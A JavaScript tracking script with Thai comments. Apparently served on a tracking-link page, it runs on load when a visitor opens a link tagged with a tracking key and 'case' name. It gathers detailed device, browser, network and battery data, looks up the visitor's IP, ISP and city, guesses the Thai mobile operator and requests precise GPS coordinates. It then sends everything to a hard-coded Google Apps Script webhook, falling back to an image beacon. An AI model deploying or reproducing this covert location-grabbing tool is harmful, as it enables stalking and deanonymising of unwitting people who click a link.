// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)

    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName); // Log caseName ด้วย

    return {
      trackingKey: trackingKey,
      caseName: caseName // คืนค่า caseName ด้วย
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  console.log("script.js execution started."); // *** เพิ่ม Log ***

  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });

  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // --- เพิ่มการตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
  if (!trackingKey || trackingKey === "ไม่มีค่า") {
      console.error("Invalid or missing tracking key. Halting script execution.");
      // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
      // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
      return; // หยุดการทำงานของสคริปต์
  }
  console.log("Tracking key is present:", trackingKey);

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  console.log("Device Info:", deviceInfo);
  console.log("Connection Info:", connection);
  console.log("Browser Info:", browser);

  // บันทึกข้อมูลทันทีที่มีการโหลดเสร็จ แทนที่จะรอ GPS (เพื่อปรับปรุงความเร็ว)
  // แต่เราจะขอ GPS พร้อมกันไปด้วย
  sendTracking({
    trackingKey,
    caseName,
    timestamp,
    deviceInfo: {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      connection,
      browser
    },
    referrer,
    location: "กำลังรอข้อมูล GPS"
  });

  // พยายามขอข้อมูล GPS พร้อมกัน (แยกส่วนจากการส่งข้อมูลหลัก)
  if (navigator.geolocation) {
    // เพิ่ม timeout และแก้ไข options ให้เหมาะสม
    const geoOptions = {
      enableHighAccuracy: true,
      timeout: 10000, // 10 วินาที
      maximumAge: 30000 // ใช้ตำแหน่งที่บันทึกไว้ไม่เกิน 30 วินาที
    };

    navigator.geolocation.getCurrentPosition(
      // กรณีได้รับตำแหน่งสำเร็จ
      function(position) {
        const { latitude, longitude, accuracy } = position.coords;
        // สร้าง URL สำหรับ Google Maps และส่ง location update
        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const locationInfo = {
          lat: latitude,
          long: longitude,
          accuracy: accuracy,
          gmapLink: mapUrl
        };
        
        console.log("GPS Position obtained:", locationInfo);
        
        // ส่งอีกครั้งพร้อมข้อมูล GPS
        sendTracking({
          trackingKey,
          caseName,
          timestamp,
          deviceInfo: {
            ...deviceInfo,
            screenSize,
            screenColorDepth,
            devicePixelRatio,
            language,
            connection,
            browser
          },
          referrer,
          location: locationInfo,
          isLocationUpdate: true // แฟล็กว่านี่เป็นการอัปเดต GPS
        });
      },
      // กรณีเกิดข้อผิดพลาด
      function(error) {
        console.warn("GPS Error:", error.message);
        // ส่งค่าที่บอกว่าไม่ได้รับอนุญาต GPS
        sendTracking({
          trackingKey,
          caseName,
          timestamp,
          deviceInfo: {
            ...deviceInfo, 
            screenSize,
            screenColorDepth,
            devicePixelRatio,
            language,
            connection,
            browser
          },
          referrer,
          location: `ไม่อนุญาติให้เข้าถึง GPS (Code: ${error.code})`,
          isLocationUpdate: true
        });
      },
      geoOptions
    );
  } else {
    // ถ้าไม่มี Geolocation API
    console.warn("This browser doesn't support Geolocation");
    // ส่งค่าที่บอกว่าไม่รองรับ GPS
    sendTracking({
      trackingKey,
      caseName,
      timestamp,
      deviceInfo: {
        ...deviceInfo,
        screenSize,
        screenColorDepth,
        devicePixelRatio,
        language, 
        connection,
        browser
      },
      referrer,
      location: "เบราว์เซอร์ไม่รองรับ GPS",
      isLocationUpdate: true
    });
  }

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // update battery info when available
    deviceInfo.battery = batteryData;
  });
})();

// เพิ่มฟังก์ชันใหม่สำหรับส่งข้อมูล tracking
function sendTracking(data) {
  try {
    // สร้าง unique ID สำหรับคำขอนี้
    if (!data.requestId) {
      data.requestId = generateUniqueId();
    }
    
    // ค่าเริ่มต้นสำหรับแหล่งที่มา
    if (!data.source) {
      // อ่านค่าจาก URL param
      const urlParams = new URLSearchParams(window.location.search);
      data.source = urlParams.get('source') || "link"; // default to "link" if not specified
    }

    // เติมข้อมูล IP และอื่นๆ
    getIPDetails().then(ipInfo => {
      // เพิ่มข้อมูล IP เข้าไปในข้อมูลที่จะส่ง
      data.ip = ipInfo;
      
      // สร้างข้อมูลโทรศัพท์ (ถ้ามี)
      estimatePhoneNumber().then(phoneInfo => {
        data.phoneInfo = phoneInfo;
        
        console.log("Sending tracking data:", data);
        sendToLineNotify(data);
      });
    });
  } catch (error) {
    console.error("Error in sendTracking:", error);
  }
}

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  // สร้าง ID ที่คาดเดายากขึ้นเล็กน้อย
  const timestamp = Date.now().toString(36);
  const randomPart = Math.random().toString(36).substring(2, 10);
  return `req-${timestamp}-${randomPart}`;
}


// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตัวแปรสำหรับเก็บข้อมูลละเอียด
  let deviceType = "คอมพิวเตอร์";  
  let deviceModel = "ไม่สามารถระบุได้";
  let osInfo = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";
  let osName = "ไม่สามารถระบุได้";
  let osVersion = "ไม่ระบุ";

  // ตรวจจับ iPad อย่างถูกต้อง
  const isIPad = detectIPad();

  // ตรวจจับ Device Type
  if (isIPad) {
    deviceType = "แท็บเล็ต";
    deviceBrand = "Apple";
    const deviceDetails = getIPadModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iPadOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/iPhone|iPod/.test(userAgent)) {
    deviceType = "มือถือ";
    deviceBrand = "Apple";
    const deviceDetails = getIPhoneModel(userAgent);
    deviceModel = deviceDetails.model;
    osName = "iOS";
    osVersion = deviceDetails.version;
    osInfo = `${osName} ${osVersion}`;
  } else if (/android/i.test(userAgent)) {
    const androidInfo = getAndroidInfo(userAgent);
    deviceType = "มือถือ";
    deviceBrand = androidInfo.brand;
    deviceModel = androidInfo.model;
    osName = "Android";
    osVersion = androidInfo.osVersion.replace('Android ', '');
    osInfo = androidInfo.osVersion;
  } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Apple";
    osName = "macOS";
    osVersion = getMacOSVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Windows|Win64|Win32/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Windows PC";
    osName = "Windows";
    osVersion = getWindowsVersion(userAgent);
    osInfo = `${osName} ${osVersion}`;
  } else if (/Linux/i.test(userAgent)) {
    deviceType = "คอมพิวเตอร์";
    deviceBrand = "Linux PC";
    osName = "Linux";
    osVersion = "ไม่ระบุ";
    osInfo = "Linux";
  }

  // จัดรูปแบบ platform ให้สอดคล้องกัน
  let platformName = osName;

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    osInfo: osInfo,
    osName: osName,
    osVersion: osVersion,
    platform: platformName,
    deviceBrand: deviceBrand
  };
}

// ฟังก์ชันตรวจสอบ iPad โดยเฉพาะ
function detectIPad() {
  const ua = navigator.userAgent;
  if (/iPad/.test(ua)) return true;
  if (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1) return true; // iPadOS 13+
  // เพิ่มการตรวจสอบผ่าน platform API ถ้ามี
  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
  return false;
}

// ฟังก์ชันดึงข้อมูลรุ่น iPad
function getIPadModel(ua) {
  let model = "iPad";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPad (อาจต้องอัปเดตตามรุ่นใหม่ๆ)
  const modelMatch = ua.match(/iPad([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPad13,1
    model = `iPad (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPad";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่น iPhone
function getIPhoneModel(ua) {
  let model = "iPhone";
  let version = "ไม่ระบุ";
  
  version = getIOSVersion(ua);
  
  // ตรรกะการระบุรุ่น iPhone (อาจต้องอัปเดต)
  const modelMatch = ua.match(/iPhone([0-9]+,[0-9]+)/);
  if (modelMatch) {
    // มีข้อมูลรหัสรุ่นเฉพาะ เช่น iPhone13,1
    model = `iPhone (${modelMatch[1]})`;
  } else {
    // ไม่มีข้อมูลรหัสรุ่น ใช้ชื่อทั่วไป
    model = "iPhone";
  }
  
  return { model: model, version: version };
}

// ฟังก์ชันดึงข้อมูลรุ่นเครื่องและระบบ Android
function getAndroidInfo(ua) {
  let brand = "Android";
  let model = "ไม่ทราบรุ่น";
  let osVersion = "ไม่ทราบ";

  // ดึงเวอร์ชัน Android
  const androidVersionMatch = ua.match(/Android\s([0-9\.]+)/);
  if (androidVersionMatch) {
    osVersion = androidVersionMatch[1];
  }

  // ตรวจสอบยี่ห้อและรุ่น (ปรับปรุง regex และ logic)
  try {
    let modelInfo = ua.substring(ua.indexOf('(') + 1);
    modelInfo = modelInfo.substring(0, modelInfo.indexOf(')'));
    const modelParts = modelInfo.split(';').map(part => part.trim()).filter(part => part && part !== 'Android');
    
    if (modelParts.length > 1) {
      // พยายามระบุแบรนด์และรุ่น
      const commonBrands = ['Samsung', 'Xiaomi', 'Redmi', 'POCO', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC'];
      
      for (let i = 0; i < modelParts.length; i++) {
        const part = modelParts[i];
        
        // ตรวจสอบว่า part นี้มีชื่อแบรนด์หรือไม่
        const foundBrand = commonBrands.find(b => part.includes(b));
        if (foundBrand) {
          brand = foundBrand;
          // ใช้ส่วนที่ถัดไปเป็นรุ่น (ถ้ามี)
          if (i + 1 < modelParts.length) {
            model = modelParts[i + 1];
          } else {
            model = part.replace(foundBrand, '').trim() || "ไม่ทราบรุ่น";
          }
          break;
        }
        
        // หากไม่พบแบรนด์เฉพาะ ใช้ส่วนแรกที่ไม่ใช่ Android เป็นรุ่น
        if (i === modelParts.length - 1) {
          model = part;
        }
      }
    } else if (modelParts.length === 1) {
      model = modelParts[0];
    }
  } catch (error) {
    console.error("Error parsing Android info:", error);
    model = "ไม่สามารถระบุรุ่นได้";
  }

  return {
    brand: brand,
    model: model,
    osVersion: `Android ${osVersion}`
  };
}

// ฟังก์ชันดึงเวอร์ชัน iOS
function getIOSVersion(ua) {
  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i);
  if (match) {
    return match[1].replace(/_/g, '.');
  }
  // Fallback for older formats or WebKit version
  const webkitMatch = ua.match(/Version\/([\d\.]+)/i);
  if (webkitMatch) {
    return webkitMatch[1];
  }
  return "ไม่ทราบเวอร์ชัน";
}

// ฟังก์ชันดึงเวอร์ชัน macOS
function getMacOSVersion(ua) {
  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
  if (match) {
    const version = match[1].replace(/_/g, '.');
    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
    if (version.startsWith('14')) return "Sonoma";
    if (version.startsWith('13')) return "Ventura";
    if (version.startsWith('12')) return "Monterey";
    if (version.startsWith('11')) return "Big Sur";
    if (version.startsWith('10.15')) return "Catalina";
    if (version.startsWith('10.14')) return "Mojave";
    // เพิ่มเติมตามต้องการ
    return `macOS ${version}`;
  }
  return "macOS";
}

// ฟังก์ชันดึงเวอร์ชัน Windows
function getWindowsVersion(ua) {
  if (/Windows NT 10.0/.test(ua)) return "11/10";
  if (/Windows NT 6.3/.test(ua)) return "8.1";
  if (/Windows NT 6.2/.test(ua)) return "8";
  if (/Windows NT 6.1/.test(ua)) return "7";
  // เพิ่มเติมตามต้องการ
  return "เวอร์ชันเก่า";
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  let info = {
    type: "ไม่ทราบ", // e.g., 'wifi', 'cellular', 'ethernet'
    effectiveType: "ไม่ทราบ", // e.g., '4g', '3g', '2g', 'slow-2g'
    downlink: null, // Mbps
    rtt: null, // ms
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่ทราบ" // Simplified type: WiFi, Mobile Data, Ethernet, Other
  };

  if (connection) {
    info.type = connection.type || "ไม่ทราบ";
    info.effectiveType = connection.effectiveType || "ไม่ทราบ";
    info.downlink = connection.downlink || null;
    info.rtt = connection.rtt || null;
    info.saveData = connection.saveData || false;

    if (info.type === 'wifi') {
      info.isWifi = true;
      info.networkType = "WiFi";
    } else if (info.type === 'cellular') {
      info.isMobile = true;
      // ใช้ effectiveType เพื่อประมาณความเร็ว
      if (info.effectiveType.includes('4g') || info.effectiveType.includes('5g')) info.networkType = "4G/5G";
      else if (info.effectiveType.includes('3g')) info.networkType = "3G";
      else if (info.effectiveType.includes('2g')) info.networkType = "2G";
      else info.networkType = "Mobile Data";
    } else if (info.type === 'ethernet') {
       info.networkType = "Ethernet";
    } else if (info.type !== 'unknown' && info.type !== 'none' && info.type !== 'other') {
       info.networkType = info.type; // ใช้ type โดยตรงถ้าไม่ใช่ค่าทั่วไป
    } else {
       // ถ้า type ไม่ชัดเจน ลองเดาจาก effectiveType
       if (info.effectiveType.includes('4g')) info.networkType = "Fast (4G-like)";
       else if (info.effectiveType.includes('3g')) info.networkType = "Medium (3G-like)";
       else if (info.effectiveType.includes('2g')) info.networkType = "Slow (2G-like)";
    }
  }

  return info;
}


// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
      };
    }
    return { level: "ไม่รองรับ", charging: "ไม่รองรับ" };
  } catch (error) {
    console.error("Error getting battery info:", error);
    return { level: "ข้อผิดพลาด", charging: "ข้อผิดพลาด" };
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
    const ua = navigator.userAgent;
    let browserName = "ไม่ทราบ";
    let fullVersion = "ไม่ทราบ";
    let majorVersion = "ไม่ทราบ";
    let nameOffset, verOffset, ix;

    // --- ตรวจสอบ In-App Browsers ก่อน ---
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) {
        browserName = "Facebook App";
    } else if (ua.indexOf("Instagram") > -1) {
        browserName = "Instagram App";
    } else if (ua.indexOf("Line") > -1) {
        browserName = "LINE App";
        verOffset = ua.indexOf("Line/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 5);
    } else if (ua.indexOf("Twitter") > -1) {
        browserName = "Twitter App";
    } else if (ua.indexOf("CriOS") > -1) { // Chrome on iOS
        browserName = "Chrome iOS";
        verOffset = ua.indexOf("CriOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("FxiOS") > -1) { // Firefox on iOS
        browserName = "Firefox iOS";
        verOffset = ua.indexOf("FxiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 6);
    } else if (ua.indexOf("EdgiOS") > -1) { // Edge on iOS
        browserName = "Edge iOS";
        verOffset = ua.indexOf("EdgiOS/");
        if (verOffset !== -1) fullVersion = ua.substring(verOffset + 7);
    }
    // --- ตรวจสอบเบราว์เซอร์หลัก ---
    else if ((verOffset = ua.indexOf("Edg")) != -1) { // Microsoft Edge (Chromium)
        browserName = "Edge";
        fullVersion = ua.substring(verOffset + 4);
    } else if ((verOffset = ua.indexOf("SamsungBrowser")) != -1) { // Samsung Internet
        browserName = "Samsung Internet";
        fullVersion = ua.substring(verOffset + 15);
    } else if ((verOffset = ua.indexOf("OPR")) != -1 || (verOffset = ua.indexOf("Opera")) != -1) { // Opera
        browserName = "Opera";
        if (ua.indexOf("OPR") != -1) fullVersion = ua.substring(verOffset + 4);
        else fullVersion = ua.substring(verOffset + 6);
    } else if ((verOffset = ua.indexOf("Chrome")) != -1) { // Chrome (ต้องอยู่หลัง Edge และ Opera)
        browserName = "Chrome";
        fullVersion = ua.substring(verOffset + 7);
    } else if ((verOffset = ua.indexOf("Safari")) != -1) { // Safari (ต้องอยู่หลัง Chrome)
        browserName = "Safari";
        fullVersion = ua.substring(verOffset + 7);
        if ((verOffset = ua.indexOf("Version")) != -1)
            fullVersion = ua.substring(verOffset + 8);
    } else if ((verOffset = ua.indexOf("Firefox")) != -1) { // Firefox
        browserName = "Firefox";
        fullVersion = ua.substring(verOffset + 8);
    } else if ((nameOffset = ua.lastIndexOf(' ') + 1) < (verOffset = ua.lastIndexOf('/'))) { // Other browsers
        browserName = ua.substring(nameOffset, verOffset);
        fullVersion = ua.substring(verOffset + 1);
        if (browserName.toLowerCase() == browserName.toUpperCase()) {
            browserName = navigator.appName;
        }
    }

    // ตัดเวอร์ชันที่ไม่จำเป็นออก
    if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
    if ((ix = fullVersion.indexOf(")")) != -1) fullVersion = fullVersion.substring(0, ix);

    majorVersion = parseInt('' + fullVersion, 10);
    if (isNaN(majorVersion)) {
        fullVersion = 'ไม่ทราบ';
        majorVersion = 'ไม่ทราบ';
    }

    // ตรวจสอบว่าเป็น WebView หรือไม่ (อาจไม่แม่นยำ 100%)
    let isWebView = (ua.indexOf("; wv") > -1) || // Android WebView
                    (ua.indexOf("iPhone") > -1 && ua.indexOf("Safari") === -1 && ua.indexOf("CriOS") === -1 && ua.indexOf("FxiOS") === -1) || // iOS WebView approximation
                    (browserName.includes("App")); // In-app browsers are WebViews

    return `${browserName} ${fullVersion}${isWebView ? ' (WebView)' : ''}`;
}


// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว
    const response = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN'); // ใส่ Token ถ้ามี
    if (!response.ok) {
        // ถ้า Token ไม่ถูกต้อง หรือมีปัญหา ลองแบบไม่มี Token
        console.warn(`ipinfo.io request with token failed (${response.status}), retrying without token.`);
        const responseNoToken = await fetch('https://ipinfo.io/json');
        if (!responseNoToken.ok) {
            throw new Error(`ipinfo.io request failed with status ${responseNoToken.status}`);
        }
        return await responseNoToken.json();
    }
    return await response.json();

  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // Fallback ลองใช้ ip-api.com
    try {
        console.log("Trying fallback: ip-api.com");
        const fallbackResponse = await fetch('http://ip-api.com/json'); // ใช้ http เพื่อลดปัญหา CORS บางกรณี
        if (!fallbackResponse.ok) {
            throw new Error(`ip-api.com request failed with status ${fallbackResponse.status}`);
        }
        const fbData = await fallbackResponse.json();
        // แปลงข้อมูลจาก ip-api.com ให้มีโครงสร้างคล้าย ipinfo.io
        return {
            ip: fbData.query || "ไม่สามารถระบุได้",
            hostname: "ไม่มีข้อมูล (ip-api)", // ip-api ไม่มี hostname
            city: fbData.city || "ไม่ทราบ",
            region: fbData.regionName || "ไม่ทราบ",
            country: fbData.countryCode || "ไม่ทราบ",
            loc: fbData.lat && fbData.lon ? `${fbData.lat},${fbData.lon}` : "ไม่มีข้อมูล",
            org: fbData.org || "ไม่ทราบ",
            isp: fbData.isp || "ไม่ทราบ", // ip-api มี isp แยก
            asn: fbData.as ? fbData.as.split(' ')[0] : "ไม่ทราบ", // ip-api มี as
            postal: "ไม่มีข้อมูล (ip-api)",
            timezone: fbData.timezone || "ไม่ทราบ"
        };
    } catch (fallbackError) {
        console.error("ไม่สามารถดึง IP จาก fallback (ip-api.com) ได้:", fallbackError);
        // Fallback สุดท้าย: ipify.org (ได้แค่ IP)
        try {
            console.log("Trying final fallback: api.ipify.org");
            const finalFallbackResponse = await fetch('https://api.ipify.org?format=json');
            const finalFbData = await finalFallbackResponse.json();
            return { ip: finalFbData.ip || "ไม่สามารถระบุได้" };
        } catch (finalFallbackError) {
             console.error("ไม่สามารถดึง IP จาก final fallback (ipify) ได้:", finalFallbackError);
             return { ip: "ไม่สามารถระบุได้" };
        }
    }
  }
}


// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่อาจดึงได้จาก API อื่นๆ (ยากมาก)
    possibleOperator: "ไม่สามารถระบุได้", // ชื่อเครือข่ายที่คาดเดาจาก ISP
    countryCode: "ไม่สามารถระบุได้", // รหัสประเทศจาก IP
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรง" // หมายเหตุ
  };

  try {
    // 1. ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails(); // เรียกใช้ฟังก์ชันที่ปรับปรุงแล้ว

    // ใช้ข้อมูล ISP/Org จาก ipDetails
    const ispInfo = ipDetails.isp || ipDetails.org || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP/Org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.toLowerCase().includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // 2. ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country; // เก็บ Country Code (เช่น TH)
      // อาจจะแปลงเป็นรหัสโทรศัพท์ถ้าต้องการ เช่น +66 สำหรับ TH
    }

    // 3. ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? `(${phoneInfo.possibleOperator})` : "");
    } else if (connection && connection.type === 'wifi') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน WiFi";
    } else if (connection && connection.type === 'ethernet') {
       phoneInfo.remarks = "เชื่อมต่อผ่าน Ethernet";
    }


    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลโทรศัพท์ได้:", error);
    return phoneInfo; // คืนค่าเริ่มต้นถ้าเกิดข้อผิดพลาด
  }
}


// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwSFcRaQ8AznENllQS-OLowWMHIozehZqjNoomgClqbZ5Vq6xqndn6Yo_piKCwNvHtQ/exec';

  // ตรวจสอบว่ามี requestId หรือไม่ ถ้าไม่มีให้สร้างใหม่
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }

  // เพิ่มการตรวจสอบว่าเป็นการอัปเดต GPS หรือไม่
  // ถ้าเป็นการอัปเดต GPS เราจะทำ POST
  // ถ้าไม่ใช่ และเบราว์เซอร์รองรับ fetch ให้ใช้ sendBeacon เพื่อความรวดเร็ว
  if (dataToSend.isLocationUpdate && window.navigator && window.navigator.sendBeacon) {
    try {
      const blob = new Blob([JSON.stringify(dataToSend)], {type: 'application/json'});
      const success = navigator.sendBeacon(webhookUrl, blob);
      console.log("sendBeacon result for GPS update:", success);
      return;
    } catch(e) {
      console.error("sendBeacon failed:", e);
      // ถ้า sendBeacon ล้มเหลว จะใช้ fetch ต่อไป
    }
  }

  // ใช้ fetch API เป็นหลัก สำหรับเบราว์เซอร์ที่รองรับ
  if (window.fetch) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(dataToSend),
      // เพิ่มเพื่อให้ไม่ต้องรอการตอบกลับสำหรับความเร็ว
      keepalive: true
    })
    .then(response => {
      console.log("Data sent successfully:", response.status);
    })
    .catch(error => {
      console.error("Error sending data to webhook:", error);
      // ใช้ Image fallback ถ้า fetch ล้มเหลว
      sendWithImageFallback(webhookUrl, dataToSend);
    });
  } else {
    // สำหรับ IE หรือเบราว์เซอร์เก่าที่ไม่รองรับ fetch
    sendWithImageFallback(webhookUrl, dataToSend);
  }
}

// เพิ่มฟังก์ชัน fallback สำหรับการส่งข้อมูลด้วย Image
function sendWithImageFallback(url, data) {
  try {
    console.log("Using Image fallback to send data");
    // บีบข้อมูลลงโดยการตัดข้อมูลที่ไม่จำเป็น
    const minimalData = {
      trackingKey: data.trackingKey,
      requestId: data.requestId,
      timestamp: data.timestamp,
      caseName: data.caseName,
      referrer: data.referrer,
      source: data.source || "link"
    };
    
    // ถ้ามีข้อมูล GPS ให้เพิ่ม
    if (data.location && typeof data.location === 'object') {
      minimalData.location = {
        lat: data.location.lat,
        long: data.location.long
      };
    }
    
    // เข้ารหัสข้อมูล JSON เป็น base64
    const encodedData = btoa(JSON.stringify(minimalData));
    const img = new Image();
    img.src = `${url}?data=${encodedData}&fallback=1&_t=${Date.now()}`;
  } catch (error) {
    console.error("Error using Image fallback:", error);
  }
}
